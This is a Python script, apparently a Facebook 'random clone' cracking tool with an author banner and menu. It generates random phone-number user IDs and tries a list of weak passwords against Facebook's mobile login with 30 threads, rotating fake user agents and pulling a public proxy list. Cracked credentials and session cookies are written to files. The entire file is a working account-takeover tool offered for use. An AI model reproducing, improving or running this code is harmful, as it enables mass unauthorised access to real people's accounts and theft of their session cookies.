import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J710MN Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/317.0.0.12.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 10; STK-LX3 Build/HUAWEISTK-LX3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36HiSearch/22.0.6.305",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-G781V Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/4.2.1",]
ua = ["Mozilla/5.0 (iPhoneX; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1 MobileApp/5.1.0",]
ua = ["Mozilla/5.0 (Linux; Android 4.3; SGH-T999L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J730FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2630.87 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; TC20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 OPR/32.0.2254.122976",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10.0.1; Redmi Note 5 Pro Build/RD1A.201105.003.C1) [FBAN/MobileAdsManagerAndroid;FBAV/335.0.0.30.47;FBBV/489275666;FBDM/{density=2.75,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 5.0; R7Plus Build/O11019) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/394408901;FBCR/Metfone;FBMF/OPPO;FBBD/OPPO;FBDV/R7Plus;FBSV/5.0;FBCA/armeabi-v7a",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo XT2081-4 Build/QCZ30.30-Q3-45-17) [FBAN/Orca-Android;FBAV/393.0.0.35.106;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/197803937;FBCR/lifecell;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo XT2081-4;FBSV/5.1.1;FBCA/armeabi-v7a",]
ua = ["Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a",]
ua = ["Dalvik/1.6.0 (Linux; U; Android 7.1.1; 768 Build/1280) [FBAN/FB4A;FBAV/108.0.0.17.68;FBBV/108;FBDM/{density=3.0,width=768,height=1280};FBLC/it_IT;FBRV/108.0.0.17.68;FBCR/Roshan;FBMF/Samsung_Galaxy_Note_20_Ultra;FBBD/Samsung_Galaxy_Note_20_Ultra;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_Note_20_Ultra_7_1_1;FBSV/7.1.1;FBOP/1;FBCA/x86:armeabi-v7a",]
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""\033[1;37m
  _____            _    _       _______ 
 |  __ \     /\   | |  | |   /\|__   __|
 | |__) |   /  \  | |__| |  /  \  | |   
 |  _  /   / /\ \ |  __  | / /\ \ | |   
 | | \ \  / ____ \| |  | |/ ____ \| |   
 |_|  \_\/_/    \_\_|  |_/_/    \_\_|                                           
                                        
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : RAHAT CHOWDHURY 
\033[1;32m  GITHUB    : CYBER-XIHAD
\033[1;32m  FACEBOOK  : RAHAT CHOWDHURY 
\033[1;32m  TOOL NAME : RANDOM CLONE
\033[1;32m  TOOL TYPE : FREE
\033[1;32m  VERSION   : 10.9
\033[1;32m  STATUS    : WIFI+DATA
\033[1;32m---------------------------------------------------------""")

logo1 = ("""\033[1;37m
 _____            _    _       _______ 
 |  __ \     /\   | |  | |   /\|__   __|
 | |__) |   /  \  | |__| |  /  \  | |   
 |  _  /   / /\ \ |  __  | / /\ \ | |   
 | | \ \  / ____ \| |  | |/ ____ \| |   
 |_|  \_\/_/    \_\_|  |_/_/    \_\_|                                           
                                        
==================================================""")

def alaminx():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        Alamin =input("\n [?] Choose : ")
        if Alamin in ["1","01"]:
            fuck()
        if Alamin in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('[+] Total ids: '+tl)
        print("[+] Your Code: "+code)
        print('[+] Process has been started')
        print('[+] Use flight mode for speed up')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','Free Fire','I Love You','Sadiya','Sumaiya','Alamin','Mahiya','@@@###','708090','Shahin']
            yaari.submit(alamin2,uid,pwx,tl)
    print('==================================================')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in GREEN/OK.txt')
    print(' [+] CP Ids saved in RED/CP.txt')
    print('==================================================')
def alamin2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[GREEN-LOVER]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': "*/*",
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-AU,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,as-IN;q=0.6,as;q=0.5,en-GB;q=0.4,en-US;q=0.3',
            'cache-control': 'max-age=0',
        # 'cookie': 'ps_l=0; ps_n=0; datr=-qy4ZUi-Oa5I1i_xm3mqFeTT; sb=-qy4ZbEiHRgStvog5gNbCD7y',
           'dpr': '2.75',
           'sec-ch-prefers-color-scheme': 'dark',
           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"V2035"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"13.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
           'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;92m[GREEN-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/GREEN/OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\033[1;94m[RED-CP] {cid}|{ps}")
                open('/sdcard/RED-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
